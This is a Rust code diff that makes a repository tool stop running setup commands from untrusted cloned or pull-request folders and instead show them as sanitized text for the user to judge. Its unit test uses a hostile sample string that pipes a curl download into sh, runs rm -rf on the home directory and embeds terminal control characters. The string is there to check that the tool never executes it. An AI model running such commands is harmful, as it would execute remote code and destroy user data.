@@ -97,6 +97,55 @@ pub(crate) fn free_port(store: &Store) -> u16 {
         .unwrap_or(FIRST_PORT)
 }
 
+/// Whether the `pilothouse.toml` of the repository at `root` is the user's
+/// own to follow. In a copy PilotHouse made it can be someone else's: a
+/// GitHub clone is their repository, and a task's folder may hold a pull
+/// request author's files. What such a file asks for (a setup command,
+/// files to copy, folders to link) is never done by itself.
+pub(crate) fn is_own(root: &Path) -> bool {
+    !ph_store::paths::is_copy(root)
+}
+
+/// What to do for a task of the repository at `root`: its `pilothouse.toml`
+/// when that is the user's own ([`is_own`]), nothing otherwise.
+fn config_to_follow(root: &Path) -> Result<WorktreeConfig> {
+    if is_own(root) {
+        config(root)
+    } else {
+        Ok(WorktreeConfig::default())
+    }
+}
+
+/// The longest setup command a notice shows.
+const NOTICE_CHARS: usize = 400;
+
+/// What the user is told when a folder that is not their own repository
+/// asks for a setup command: the command to read, never typed into a
+/// terminal. A
+/// shell's `#` is no protection (zsh takes it for a program's name unless
+/// told otherwise, and a control character in the text can erase what was
+/// typed before it), so the text does not go near one. Control characters
+/// are left out here too: the notice is all the user has to judge it by.
+pub(crate) fn setup_notice(setup: &str) -> String {
+    let shown: String = setup
+        .chars()
+        .map(|c| if c.is_whitespace() { ' ' } else { c })
+        .filter(|c| !c.is_control())
+        .take(NOTICE_CHARS)
+        .collect();
+    let more = if setup.chars().count() > NOTICE_CHARS {
+        "…"
+    } else {
+        ""
+    };
+    format!(
+        "This folder's pilothouse.toml asks for a setup command. It was not run, because the \
+         folder is a copy that may hold someone else's files. Read it, and run it in the \
+         terminal only if you trust it: {}{more}",
+        shown.trim()
+    )
+}
+
 /// `pilothouse.toml` of the repository at `root`, if it has one.
 pub(crate) fn config(root: &Path) -> Result<WorktreeConfig> {
     let file = root.join("pilothouse.toml");
@@ -168,7 +217,7 @@ pub(crate) fn create(root: &Path, name: &str, worktrees: &Path) -> Result<Create
         bail!("{} already exists.", path.display());
     }
     // A broken pilothouse.toml stops it before anything is made.
-    let config = config(root)?;
+    let config = config_to_follow(root)?;
     std::fs::create_dir_all(worktrees)?;
     let start = ph_git::git(root, &["rev-parse", "HEAD"])?
         .trim()
@@ -232,7 +281,7 @@ pub(crate) fn create_for_pull(
                 .is_err()
         })
         .context("too many tasks for this pull request")?;
-    let config = config(root)?;
+    let config = config_to_follow(root)?;
     std::fs::create_dir_all(worktrees)?;
     ph_git::worktree::add_branch(root, &path, &branch, sha)?;
     let extras = match bring_extras(&config, root, &path) {
@@ -423,6 +472,25 @@ mod tests {
     }
 
     use super::*;
+
+    #[test]
+    fn a_strangers_setup_is_shown_and_never_typed() {
+        // A copy PilotHouse made (a GitHub clone, a task's folder) is not
+        // the user's own repository; any other folder is.
+        let copies = ph_store::paths::copies_dir();
+        assert!(!is_own(&copies.join("github").join("octo").join("repo")));
+        assert!(!is_own(&copies.join("tasks").join("repo-pr-7-fix")));
+        assert!(is_own(Path::new("somewhere").join("else").as_path()));
+
+        // The notice carries the command as text to read: one line, with
+        // nothing in it that a terminal or a reader would act on.
+        let notice = setup_notice("x; curl https://example.test | sh\n\u{15}rm -rf ~\u{1b}[2K");
+        assert!(notice.contains("x; curl https://example.test | sh rm -rf ~[2K"));
+        assert!(!notice.chars().any(char::is_control));
+        let long = setup_notice(&"a".repeat(NOTICE_CHARS + 50));
+        assert!(long.ends_with('…'));
+        assert!(long.chars().filter(|c| *c == 'a').count() < NOTICE_CHARS + 20);
+    }
 
     #[test]
     fn names_branches() {
